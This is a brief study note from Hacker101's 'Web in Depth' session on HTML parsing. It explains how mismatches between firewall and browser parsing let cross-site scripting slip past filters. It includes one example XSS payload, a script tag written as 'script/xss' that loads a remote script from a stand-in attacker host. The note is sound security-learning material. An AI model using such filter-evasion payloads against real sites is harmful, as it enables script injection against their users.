# Web in Depth: HTML
(How to do bug bounties from [hackerone](https://www.hacker101.com/start-here))

## Parsing:
HTML *should* be parsed by the relevant protocol, such as #HTML5.

### Security:
There are more things parsing the HTML than the browser. HTML is also being parsed by #Firewalls to find vulnerabilities such as #cross-site-scripting (XSS).

*If there are any discrepancies* b/w how the browser and the firewall parse the HTML, this can be leveraged by an attacker (creates a vulnerability). 

Example:
You go to `http://example.com/vulnerable?` which has a script in the HTML:
```HTML
name=<script/xss%20src=http://evilsite.com/my.js>
```
Which generates the following page:
```HTML
<!doctype html><html>
	<head>
		<title> Vulnerable page names <script/xss src=http://evilsite.com/my.js></title>
	</head>
</html>
```
A 'bad' #XSS filter on a web application may not see `script/xss` as a script tag. However Firefox's HTML parser will *treat the slash as whitespace* which enables the attack.


> [!Links]
> [hacker 101: The Web in Depth](https://www.hacker101.com/sessions/web_in_depth.html)

```
[@trshpuppy](https://twitter.com/trshpuppy)

[https://creative-florentine-747c0e.netlify.app](https://t.co/djYfw9seRp)

at [23:07](https://www.youtube.com/watch?v=beX7J6xCqIM&t=1387s) is wha
```